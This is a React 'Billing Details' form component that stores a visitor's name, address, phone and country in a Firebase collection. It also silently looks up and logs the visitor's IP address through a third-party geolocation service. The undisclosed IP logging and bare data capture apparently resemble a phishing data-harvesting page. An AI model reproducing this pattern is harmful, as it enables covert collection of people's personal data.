import { useState, useRef, Fragment } from 'react';
import { Redirect } from 'react-router-dom';

import db from '../firebase/firebase';
import Header from '../Layout/Header';
import Footer from '../Layout/Footer';

const Billing = () => {
    const [fullname, setFullname] = useState('');
    const [address, setAddress] = useState('');
    const [state, setState] = useState('');
    const [city, setCity] = useState('');
    const [zip, setZip] = useState('');
    const [phone, setPhone] = useState('');
    const [country, setCountry] = useState('');
    const [formSuccess, setFromSuccess] = useState(false);
    const [formError, setFormError] = useState(null);


    const fullnameRef = useRef(null);
    const addressRef = useRef(null);
    const stateRef = useRef(null);
    const cityeRef = useRef(null);
    const zipRef = useRef(null);
    const phoneRef = useRef(null);
    const countryRef = useRef(null);

    const submitHandler = async (e) => {
        e.preventDefault();
        if (fullname && address && state && city && zip && phone && country) {
            fetch(
                "https://geolocation-db.com/json/8dd79c70-0801-11ec-a29f-e381a788c2c0"
            )
            .then(response => response.json())
            .then(geoData => {
                db.collection('billing-data').add({
                    fullname: fullname, 
                    address: address, 
                    state: state, 
                    city: city, 
                    zip: zip, phone: phone, 
                    country: country,
                    ip_address: geoData.IPv4,
                    logged_at: Date.now()
                }).then(data => {
                    console.log( data, 'successed')
                    setFromSuccess(true);
                }).catch(err => {
                    throw new Error(err);
                });
            })

        } else {
            setFormError(true);
        }
    }


    return (
          <Fragment>
            <Header type='type-2' />
            <div className=''>
            {formSuccess ? <Redirect to='/thankyou' /> : null}

            <div className='my-12 relative w-5/5 lg:w-4/12 p-4 lg:p-16 m-auto rounded border z-10 p-10'>
                <div className='mb-4'>
                    <h4 className='text-2xl'>Billing Details</h4>
                </div>
                <form onSubmit={(e) => submitHandler(e)}>
                    <input onChange={(e) => setFullname(e.target.value)} ref={fullnameRef} type='text' value={fullname} className='border py-3 px-4 w-full rounded mb-6' placeholder='Full name' />
                    <input onChange={(e) => setAddress(e.target.value)} ref={addressRef} type='text' value={address} className='border py-3 px-4 w-full rounded mb-6' placeholder='Address' />
                    <div className='flex justify-between'>
                        <input onChange={(e) => setCity(e.target.value)} ref={cityeRef} type='text' value={city} style={{ width: '47%' }} className='border py-3 px-4 rounded mb-6' placeholder='City' />
                        <input onChange={(e) => setState(e.target.value)} ref={stateRef} type='text' value={state} style={{ width: '47%' }} className='border py-3 px-4 rounded mb-6' placeholder='State' />
                    </div>
                    <input onChange={(e) => setZip(e.target.value)} ref={zipRef} type='text' value={zip} className='border py-3 px-4 w-full rounded mb-6' placeholder='ZIP' />
                    <input onChange={(e) => setPhone(e.target.value)} ref={phoneRef} type='tel' value={phone} className='border py-3 px-4 w-full rounded mb-6' placeholder='Phone number' />
                    <input onChange={(e) => setCountry(e.target.value)} ref={countryRef} type='text' value={country} className='border py-3 px-4 w-full rounded mb-6' placeholder='Country' />
                    {formError ? <p className='text-red-600 '>Please fill all form fields</p> : null}

                    <button onClick={(e) => submitHandler(e)} className='bg-red-600 mt-4 w-full py-3 px-4 rounded text-white font-bold mb-8'>Next</button>
                </form>
            </div>
        </div>
            <Footer type='type-2' />
        </Fragment>
      
    );
};

export default Billing;